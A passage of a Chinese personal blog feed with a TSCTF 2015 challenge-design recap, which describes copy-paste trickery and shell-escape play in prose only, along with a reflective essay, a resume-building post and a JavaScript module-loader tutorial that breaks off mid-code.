<li>决赛misc4：<a href="http://buptlug.cn/what-you-copy-is-not-you-want.html" target="_blank" rel="external">What You Copy is Not What You Want</a></li>
</ul>
<p>如果觉得有意思不要忘记评论点赞哈哈。</p>
<p>我并没有怎么参加过CTF这种牛逼哄哄的比赛，只是前一阵的ALICTF，被室友拉去打了个酱油，再我碌碌无为并未成功调出任何逆向题目和web题目的情况下，队友连下apk和web若干题目，硬是把排名拉到63左右。</p>
<p>我个人只玩过360在14年的hack game，overthewire上natas，krypto和bandit的题目，coolshell博主当年给大家玩得一个游戏。能有幸参与TSCTF的出题，真是不胜荣幸。</p>
<p>题目的设计要有粘性，有趣味，能吸引玩家往下继续深入。而不是依靠隐藏某些信息或假设玩家知道哪些信息，玩家可能是千差万别的所以一个好的题目设计并不容易。我想谈谈所看到TSCTF中的一些题目设计。</p>
<h3 id="ws">ws</h3><p>首先是我自己的决赛Misc4。最开始的设计来源于<a href="http://www.soimort.org/posts/154/" target="_blank" rel="external">soimort的一个博文</a>，告诫大家不要把html中的代码直接复制到可执行环境中去，并展示了这种危险性。我觉得一个题目要让大家感觉到很有意思，就要用令人惊奇的方式欺骗大家的眼睛，但这种欺骗并不是为了掩盖有利于解题的信息，而是让玩家能在解题的道路上体验到这种惊奇的感觉。</p>
<p>所以，开始的时候是提示了一个</p>
<pre><code><span class="built_in">echo</span> VGVhY2hlciBHOiB0aGVyZSBpcyBhIGxhbmd1YWdlIHdob3NlIG5hbWUgaXMgd2hpdGVzcGFjZQ== | base64 <span class="operator">-d</span>
</code></pre><p>我的想法很简单，玩家看到这个命令后很可能会直接把命令复制到控制台，实际上这个html偷偷藏了个输出到文件的(有点危险额)命令。</p>
<p>万万没想到，大部分人并不使用Unix，他们甚至没有看内容直接看源代码去了。。。卧槽。。。</p>
<p>后来看到使用mac的nemo直接往控制台里粘帖了，可惜后来已经不这么设计了。结果就是他在那里奇怪怎么粘帖的东西和复制的不一样= =</p>
<p>于是，为了引导玩家和照顾非unix使用者，我重新设计了游戏。对js部分进行编码(没有丧心病狂进行加密我好良心的好不好)，让html的dom结构看上去是那么回事，但一旦按下键盘按键或者鼠标就更改dom结构。</p>
<p>之后又改了几次出题组试了试几种常见浏览器，最后才是最终的版本。其实这是给初赛出的题目，Cao直接给放到决赛了。为了引导玩家进行了非常明显的提示，cslei觉得题目应该给分少些，但Cao给了350pts，最终决赛的时候大家率先把misc4完成了，分低的misc123反而好久没人做出来。。。。。。个人觉得misc123缺乏引导，这让人很难想到怎么回事，但一旦知道思路一切都不是问题，所以hint出来后misc1几乎被全A了，没放hint的misc23似乎没什么人玩。关于misc5,一道图片藏图片藏xx藏xx的题目，玩了一晚上，几经崩溃。。。这不是游戏，这是变着戏法虐人。</p>
<h3 id="sandbox">sandbox</h3><p>nemo为决赛出了两道相关的linux下shellcode和sandbox题目，sandbox题目按其设计意图是在shellcode题目的基础上完成。不过后来事情有些出乎意料。</p>
<p>sandbox的题目发到出题组的时候，我完全理解错他的意思了，他设计题目的时候想的是循环计数那里有漏洞，让玩家通过逆向分析，然后用exploit和shellcode来利用那个漏洞。我特么以为是escape shell玩了一晚上，丧心病狂以各种奇葩方式escape shell和dos nemo那个restricted shell环境的结果就是，nemo不断为其过滤黑名单添加各种过滤条件，为了防止fork bomb折腾linux系统配置到两点(建议大家不要在生产环境使用kali，那个给用户的权限高限制少)。我猜肯定还有我们没注意的其它方式，nemo已然不想管了，线下赛反正什么都方便。如果有人通过非设计者设计的方式获得flag那也算一种方式。果然，后来决赛的时候应验了。。。特么有个队shellcode根本没做就把sandbox给a掉了……</p>
<h3 id="天枢web对战平台">天枢web对战平台</h3><p>Teacher G出了一道非常灵活的决赛web题目。基于他们比赛的经验，他从一周前开始设想，最终实现、测试、上线对战系统。题目出得很是新颖，不过玩家的反应有些不太适应。Teacher G最后总结时说大家还是不太灵活。很多他设想的玩法都没有队伍去做。</p>
<p>其设计了一个有多个可利用漏洞的系统，让玩家能通过这几种方式进行对打。设计一个灵活的系统就是必须考虑各种奇葩的状况和面对奇葩的bug，结果就是为了实现这么个平台投入了大量开发和测试运维人力，Teacher G都快被bug和限制玩家的策略折磨哭了<br>，哈哈。</p>
<p>对实现的具体细节，有不同理解的cslei和Teacher G又进行了大量争论和妥协，最终上线后，发现有某个队开始一支独秀，其它队伍还在傻眼被虐中，并且很多人的解题策略安排都被这个题给打乱了。</p>
<p>好在是线下赛，经过我们npc的宏观调控(其实是一个强力的伪玩家，开始设计只是想作为玩家虐待目标)和不断的明示暗示之后，大多数队伍都走上正轨，开始了burp suite对刷大战。之后关于这个平台又放出若干提示，可惜已经晚了，平台大多功能并没有被玩家们使用。甚至。。。第一名竟然放弃了这道题= =</p>
<p>如果时间足够的话，我们还想做web可视化的攻防效果呢。可惜只有Teacher G用mascuee标签实现的好像营业厅广告般的实时战况信息。</p>
<p>很棒的一个想法和实现，总得来说。</p>
<h3 id="Coding题目">Coding题目</h3><p>Coding题目很是中规中矩，cslei在运营社团诸多繁杂事项的时候还一力承担起coding题目。出乎意料的一个是，本来有道分类识别的题目，发现解题者根本没写程序识别而是人工识别。。。。。。</p>
<p>我们说到底还真是人力不足，测试不充分。</p>
<p>大致我关注且印象比较深刻的就这些。</p>
<p>还有件惊奇的事，半年前的暑假，有个大三的学生来我们实验室做过一阵APT攻击的什么研究，今天说起来，才发现出题人之一竟然是他。。。。。。</p>
<p><img src="/images/dubhe.jpg" alt="Hacking Security" title="hacking security"></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="TSCTF2015">TSCTF2015</h2><p><img src="/images/tsctf.png" alt="TSCTF2015" title="TSCTF2015"></p>
<p>准备折腾近乎三周的TSCTF终于在昨天圆满结束，这三周来眼见到主板]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[17]]></title>
    <link href="http://reverland.org/life/2015/05/17/17/"/>
    <id>http://reverland.org/life/2015/05/17/17/</id>
    <published>2015-05-16T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<blockquote>
<p>亲爱的神，伟大的神，</p>
<p>你可以怪我想法太过无知但我只是，人</p>
</blockquote>
<h2 id="一">一</h2><p>腥咸的海风吹开了记忆的闸门，想起多年前的某个夏天，真是多年前，在日照的某个离海不远的公路上，一路上都是这种味道，天空明丽的让人害怕，还有夏天毫不留情的烈日，遍目的黄绿清晰的映在视网膜上，映在记忆中。</p>
<p>第一次吃的西瓜，竟然带着咸涩的味道，就好像多年后品尝着自己的泪水。当时只觉得新奇。</p>
<p>那时17岁，自己是新的，世界是新的，什么都是新的。连记忆都是新鲜的。</p>
<h2 id="二">二</h2><p>火车呼呼的向前，就像不可阻遏的时光一样，匆匆带走来不及细看的景色。似曾相识的道旁树，一颗一颗接着一颗，出现，消失，出现，消失</p>
<p>我好像看到了它春天初芽蓬勃向上，转眼就覆盖了白雪归于寂然，前一秒郁郁葱葱，后一刻就萧萧瑟瑟。</p>
<p>这就是我眼中的世界，</p>
<p>这就是让人无力的无常。</p>
<p>人生苦短。</p>
<h2 id="三">三</h2><p>远远望见远处有一堵高大的墙，碧蓝碧蓝的。</p>
<p>这不是我印象中的海，也是我印象中的海，只是从来没想到那堵墙看上去这么高，高不可攀，无法穿越。</p>
<p>多年前的夏天，第一次看到大海。昏黄昏黄的大海，昏黄昏黄的沙滩，远处的渔船，昏黄雾中的落日，一并沙滩上的小螃蟹，击打在脚上打起的浪花，世界都是昏黄的。</p>
<p>一切都是昏黄的，</p>
<p>一切却都是崭新的。</p>
<h2 id="四">四</h2><p>动车上有点冷，我蜷缩在列车前方最右的角落位置，听到列车上在放一首曲子。</p>
<p>旋律是沟通阴阳的桥梁，是穿越时光的隧道，是迷魂之汤与忘情之水。</p>
<p>是通向世界边境冷酷仙境的钥匙。</p>
<p>我清清楚楚记得自己弹过这首歌，还能唤起那种热切的心情和执着的心境，但我想不起来它是什么。</p>
<p>曲子随着空调的风，随着列车上嘈杂的人声，杳无踪迹。</p>
<p>伸手抓不住，眼睁睁的面对残忍的现实。</p>
<p>错过的，就错过吧。</p>
<p>就好像它重来没发生过一样一样的。</p>
<p>其实我后来想起来了，爱的罗曼史</p>
<h2 id="五">五</h2><p>松软的沙滩是再一个能唤醒记忆的东西，脱掉谢，踏上有些滚烫的细沙的第一脚，似曾相识的感觉几乎把人击倒。</p>
<p>某年的某个夏天，满怀欣喜和好奇的心情，准备好了泳衣，终于却没有下水。</p>
<p>海水冰冷的感觉一如既往。</p>
<p>你的幸福感受是什么呢？</p>
<p>与他们一起在海滩漫步，看他们在海滩上风，看他们的身姿和头发在风中飘动。</p>
<p>对了，我试着抓了一把沙</p>
<p>如果抓紧，没这么容易从指缝流失</p>
<h2 id="六">六</h2><p>今天17号，西边日出东边雨，道是无晴却有晴。匆匆地赶回这里，就是为了写下这些。</p>
<p>然而我说不出，也不能指望有人理解。</p>
<p>用记忆和生命体验加密的文字，再多的提示又有何用。</p>
<p>解密出来对别人又有何意义？</p>
<p>在小鱼船上唱着滑板鞋，随着海浪起起伏伏。</p>
<blockquote>
<p>我的生命像海浪一样有时高有时低，你是否告诉坚强自己度过各种时期。</p>
</blockquote>
]]></content>
    <summary type="html">
    <![CDATA[<blockquote>
<p>亲爱的神，伟大的神，</p>
<p>你可以怪我想法太过无知但我只是，人</p>
</blockquote>
<h2 id="一">一</h2><p>腥咸的海风吹开了记忆的闸门，想起多年前的某个夏天，真是多年前，在日照的某个离海不远的公路上，一路上都]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[难写的简历]]></title>
    <link href="http://reverland.org/life/2015/05/10//"/>
    <id>http://reverland.org/life/2015/05/10//</id>
    <published>2015-05-09T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.559Z</updated>
    <content type="html"><![CDATA[<p>每次写简历都感觉困难重重，半个月前某资深移动安全专家看着我简历说，你这太杂了，没有重点。面试腾讯的时候腾讯的安全面试官说真是够杂的。阿里前端简历都没提到前端的东西，我想如果有HR看到那份简历一定怀疑我投错部门了。不过，我算证实了阿里的笔试根本没人看。</p>
<p>今天又写了大半天简历。缘起在昨天去360前端公开课，奇舞团某位大哥看我没位置让我到前面坐，我直接把月影的位置占了(ゝ∀･)。。。</p>
<p>一直在听文博老师讲课也没注意旁边玩手机的月影的大大<em>(:з」∠)</em>…直到…月影大大给我说:</p>
<blockquote>
<p>小伙子我看你天资聪颖，骨骼惊奇，是个做前端的料子，今日你我有缘，给我发份简历吧。</p>
</blockquote>
<p>开玩笑(ง •̀_•́)ง，当然不是这么说的= =</p>
<p>简历主要参考了以下几个地方，中文还没做。。。</p>
<h2 id="折腾了一天没内容的简历">折腾了一天没内容的简历</h2><p>前一阵在看慕课网上<a href="http://www.imooc.com/learn/252" target="_blank" rel="external">css3实现网页平滑过渡效果</a><br>这个教程，就想这么用这个做简历得了。</p>
<p>既然是给前端团队的简历，而且是给国内顶尖前端团队的简历，而且是直接发给月影的简历，怎么能不尽力用上前端技术。</p>
<p>然后，忽然想到，微信发过去。。。应该是在手机上看吧。。。</p>
<p>这么大个导航栏，不合适吧。</p>
<p>而且按这种技术，没有导航栏没法导航。。。</p>
<p>我想了想，前几天看到<a href="http://www.zhihu.com/question/23150301/answer/32496711" target="_blank" rel="external">Ovilia的CV</a>。。。</p>
<p>又想了想<a href="http://ife.baidu.com/" target="_blank" rel="external">百度IFE</a>的全屏翻页效果。</p>
<p>要么就做全屏翻页效果的。。。</p>
<p>额，怎么实现呢，我自己用原生吧。。。算了，最近做IFE的作业闭门造车太久了。。。还是学习下别人的成果吧。</p>
<p>我想起一个看上去很中意的页面–<a href="http://ecomfe.github.io/fontmin/en" target="_blank" rel="external">fontmin</a></p>
<p>看看它怎么实现的。</p>
<p>看了发现超出我知识范围太多。。。开始看前面的script里有个bdstatic的域名的js文件引用，我以为是统计就去掉了，然后发现require用不了，嗯，我也奇怪没见它引用require.js呢。</p>
<p>有个app是百度自己的，还有copyright。。。算了我这做着玩也不干什么。。</p>
<p>后来仔细一看一查是百度自己做的js模块加载系统。。。<a href="https://github.com/ecomfe/esl" target="_blank" rel="external">esl</a>对此。</p>
<p>算了，我把这个引用进来吧。还用到了jquery，嗯？我是用cdn？算了下载下来吧。。。</p>
<p>还有俩jquery插件，我大概看了看文档，一下午零基础使用jquery及其插件。。。</p>
<p>lettering提供了对字符进行单独样式的功能。开始留着lettering想之后试试，最后懒得试验了。。。然后就把相关文件和函数删了。毕竟文件大了影响加载速度不是ლ(╹◡╹ლ)</p>
<p>full-page这个插件真是方便额，有点像bootstrap把html按规则写好就行，规则还特别特别简单。fullpage这个插件本来还得配合它提供的css用，不过fontmin这个页面把这部分css合并到app.css里了，连js都打包到app.js里了。我猜是为了减少HTTP请求吧。</p>
<p>app.js中放置了所有用到的全屏翻页和lettering等函数，似乎还有各种对兼容性的处理。可是它是压缩并且替换变量过的js。。。回头上github看了看没被压缩的js，除了fullpage的功能就简单的有个判断操作系统修改下载链接和lazy加载的函数，我用不上就删了。。。</p>
<p>它的字体本来觉得不错不想改，结果发现它的英文字体都用fontmin重新做过了，只打包了需要的字符。得，我<code>npm install fontmin</code>得了。自己做了个ClearView的字体，另外把它的SentyBrush重新做出来使之包含我的名字要用到的字符。</p>
<p>所有其它东西处理完毕之后，就是写自己的简历内容。首先想了想怎么安排html，怎么布局。然后就开始写css，看效果，到小屏幕上看效果，写媒体查询。这前一段在百度前端技术学院学到的这些基础真不是白学的。</p>
<p>最后。。。看上去效果还不错。logo我自己做了下，反正对于一个熟练的gimp用户随手处理个图像什么的不是问题。</p>
<p>再最后，懒得压缩css和js啥了。js我还下了个非min的好像，传网上手机看了下还不错。虽然下面有部分看不到了。。。</p>
<p>想起来百度前端技术学院的网页在我的手机上也是看不到下面的部分，又看了看ovilia姐姐的CV发现我手机都翻不了页就心安理得的干其他事去了(┙&gt;∧&lt;)┙へ┻┻&gt;)</p>
<p>就这样吧。</p>
<p>有兴趣可以看看<a href="http://resume.reverland.org" target="_blank" rel="external">resume.reverland.org</a></p>
<p>其实还是好多不会，不过还真是擅长各种quick and dirty的事情。。。</p>
<p>还有点挺遗憾，明明fontmin在加载时会显示出loading那部分页面，为啥到我这里就不行了。。。原来html结构写错了(´・ω・｀)</p>
<p>而且这完全没内容的简历怎么好意思发出去(╥_╥)</p>
<p>我想也许明天用fontmin制作下需要的字体，补充下中文简历。</p>
<p>另外，给北邮天枢CTF出了两道挺有意思的challenge，用到了web的一些奇葩特性╮(￣▽￣)╭，等比赛完了再放出来。记在这里，我怕比赛完忘了。。。</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>每次写简历都感觉困难重重，半个月前某资深移动安全专家看着我简历说，你这太杂了，没有重点。面试腾讯的时候腾讯的安全面试官说真是够杂的。阿里前端简历都没提到前端的东西，我想如果有HR看到那份简历一定怀疑我投错部门了。不过，我算证实了阿里的笔试根本没人看。</p>
<p>今天又写]]>
    </summary>
    
      <category term="life" scheme="http://reverland.org/tags/life/"/>
    
      <category term="life" scheme="http://reverland.org/categories/life/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[javascript模块机制原理]]></title>
    <link href="http://reverland.org/javascript/2015/05/02/javascript/"/>
    <id>http://reverland.org/javascript/2015/05/02/javascript/</id>
    <published>2015-05-01T16:00:00.000Z</published>
    <updated>2015-11-15T06:01:31.555Z</updated>
    <content type="html"><![CDATA[<p>eloquent javascript是一本浸润着黑客精神和文化的书，上一次看到这样的书还是在三年前，那本书叫land of lisp。</p>
<p>这是关于eloquent js第十章，模块化的一些解释。因为我觉得这部分不好理解。</p>
<h2 id="js模块化基础">js模块化基础</h2><p>我们写代码时，代码总是倾向于越来越像浆糊，越是大的全的功能，越是浆糊到不堪。我们想要看清楚些，就把不同功能分出来，揉成一堆小浆糊，这总比一大团浆糊好处理。</p>
<p>当我们想把一团js浆糊放到一起时，并称之模块时，我们会设计让它提供几个功能，这个一般叫做接口。比如<code>console</code>模块有个<code>log</code>功能，比如等等。</p>
<p>我们可以把这堆浆糊扔到一个全局变量中去，这样其它部分要是想要使用这团浆糊的功能，就使用浆糊提供的接口。比如<code>Math.PI</code>可以访问得到3.14159……。</p>
<p>这很简单，js提供了函数来隔离命名空间，对象来放置模块内容。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod1 = <span class="function"><span class="keyword">function</span> <span class="title">mod1</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123;a:<span class="number">1</span>,</span><br><span class="line">            b:print</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;()</span><br></pre></td></tr></table></figure>
<p>为啥要这样写呢，因为，假如我们不想让人看到局部变量<code>i</code>，函数是我们唯一能借以创建局部作用域的东西。</p>
<p>这就是javascript模块化的基础。</p>
<p>这样，我们想调用某个模块时，就把某个函数包裹着的东西给全局变量，调用者对这个全局变量进行操作就好。</p>
<p><code>return</code>的时候写一大堆对象内容也不合适，我们可以选择传进去个对象。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod2 = &#123;&#125;;</span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">exports</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">3</span>;</span><br><span class="line">    exports.a = i;</span><br><span class="line">    exports.b = <span class="function"><span class="keyword">function</span> <span class="title">print</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(x+i);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;(mod2))</span><br></pre></td></tr></table></figure>
<p>但是。。。</p>
<p>当这所有都得需要在全局作用域内进行。</p>
<ol>
<li><p>想想当我们要两个模块a和b都被c依赖，a依赖c0.1版而b依赖c0.2版，a和b中调用名字为c的模块。。。</p>
</li>
<li><p>或者a依赖b然后c依赖d，然而b在a中命名为xx，d在c中也命名为xx。</p>
</li>
</ol>
<p>所以，最好不通过全局作用域实现模块依赖。</p>
<p>但实际上可以做到不需要全局作用域来实现模块的依赖.接下来讨论两种常见的方案。</p>
<h2 id="向CommonJS跃进">向CommonJS跃进</h2><p>写过node程序的人都见过类似的东西</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> mod3 = <span class="built_in">require</span>(<span class="string">"mod3"</span>);</span><br></pre></td></tr></table></figure>
<p>在该模块中通过require函数引入模块，并通过变量mod3引用这个模块。不需要通过全局变量，该模块高明地引用了其它模块。</p>
<p>require实现方式如下， 通过<code>Function</code>构造函数构造函数实现命名空间, 假设我们有个read函数。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样做，每次载入都会运行模块，即使有多个模块载入一个名字的模块也会运行多次。<br>我们加个全局变量保存已经加载的模块。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    code(exports);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = exports;</span><br><span class="line">    <span class="keyword">return</span> exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在比如你想暴露个和exports对象不同的东西，比如我他妈的只想导出个函数呢，比如</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(<span class="string">'fn'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(fn);    <span class="comment">//-&gt; 1</span></span><br></pre></td></tr></table></figure>
<p>我们可以通过额外给模块传递一个叫module的参数，这个参数<code>exports</code>属性默认指向<code>exports</code>对象实现这点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>.cache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">require</span>(<span class="params">modName</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (modName <span class="keyword">in</span> <span class="built_in">require</span>.cache) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">require</span>.cache[modName];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> code = <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">"exports, module"</span>, read(modName));</span><br><span class="line">    <span class="keyword">var</span> exports = &#123;&#125;;</span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: exports&#125;;</span><br><span class="line">    code(exports, <span class="built_in">module</span>);</span><br><span class="line">    <span class="built_in">require</span>.cache[modName] = <span class="built_in">module</span>.exports;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>.exports;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当模块<code>fn</code>想返回比如1时</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">module</span>.exports = <span class="number">1</span>;</span><br></pre></td></tr></table></figure>
<p>这样，我们就实现了简单的nodejs模块系统：）Coooooooooooooooool</p>
<p>这有个啥问题呢？浏览器中的js程序执行时，浏览器啥也干不了= =。</p>
<p>read函数没读到模块内容之前，js程序一直执行，但除了等待什么都不干。假如这个read是从网络上读取模块文件，那么万一网络质量很差，这个系统都把大部分时间花在等文件加载上了。</p>
<p>为了解决这个问题，有人发明了<a href="http://browserify.org/" target="_blank" rel="external">browserify</a>.这，看做一个依赖打包服务吧。</p>
<p>另一种方案是：</p>
<h2 id="AMD">AMD</h2><p>这里的AMD不是AMD芯片的AMD，全称叫Asynchronous Module Definition。异步模块定义模块系统。</p>
<p>这个系统的核心，是一个叫做define的函数。</p>
<p>每个模块都必须这样写：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define([<span class="string">"dep1"</span>, <span class="string">"dep2"</span>], <span class="function"><span class="keyword">function</span>(<span class="params">dep1, dep2</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> dep1.a + dep2.b;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>假如不依赖其它模块</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">define([], <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> mod = &#123;a: <span class="number">1</span>, b: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">console</span>.log(<span class="string">"sb"</span>)&#125;&#125;;</span><br><span class="line">    <span class="keyword">return</span> mod;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>这个核心的define函数这么设计，</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们要实现这个递归的过程，需要一个对象来表示其状态和存放调用者的函数</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> defineCache = <span class="built_in">Object</span>.create(<span class="literal">null</span>);</span><br><span class="line"><span class="comment">// 指向当前模块的指针</span></span><br><span class="line"><span class="keyword">var</span> currentMod = <span class="literal">null</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getModule</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//如果已经加载过了就返回</span></span><br><span class="line">    <span class="keyword">if</span> (name <span class="keyword">in</span> defineCache)</span><br><span class="line">        <span class="keyword">return</span> defineCache[name];</span><br><span class="line">    <span class="comment">// 否则先返回一个对象</span></span><br><span class="line">    <span class="comment">// 等模块真正下载完后更新currentMod变量，</span></span><br><span class="line">    <span class="comment">// 同时递归执行调用子模块的define函数</span></span><br><span class="line">    <span class="keyword">var</span> <span class="built_in">module</span> = &#123;exports: <span class="literal">null</span>,</span><br><span class="line">        loaded: <span class="literal">false</span>,</span><br><span class="line">        onLoad: []&#125;;</span><br><span class="line">    defineCache[name] = <span class="built_in">module</span>;</span><br><span class="line">    <span class="comment">// 我们假设有这么个异步读取文件的函数</span></span><br><span class="line">    backgroundReadFile(name, <span class="function"><span class="keyword">function</span>(<span class="params">code</span>) </span>&#123;</span><br><span class="line">            currentMod = <span class="built_in">module</span>;</span><br><span class="line">            <span class="keyword">new</span> <span class="built_in">Function</span>(<span class="string">""</span>, code)();<span class="comment">// code会是又一个define函数调用</span></span><br><span class="line">            &#125;);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">module</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">depNames, moduleFunction</span>) </span>&#123;</span><br><span class="line">    <span class="comment">//对每个depNames中的依赖，安排异步下载</span></span><br><span class="line">    <span class="comment">//当下载都完成时，执行moduleFunction, 同时把模块接口传给它</span></span><br><span class="line">    <span class="comment">//改变其状态，通知调用者</span></span><br><span class="line">    <span class="keyword">var</span> myMod = currentMod;</span><br><span class="line">    <span class="keyword">var</span> deps = depNames.map(getModule);</span><br><span class="line"></span><br><span class="line">    deps.forEach(<span 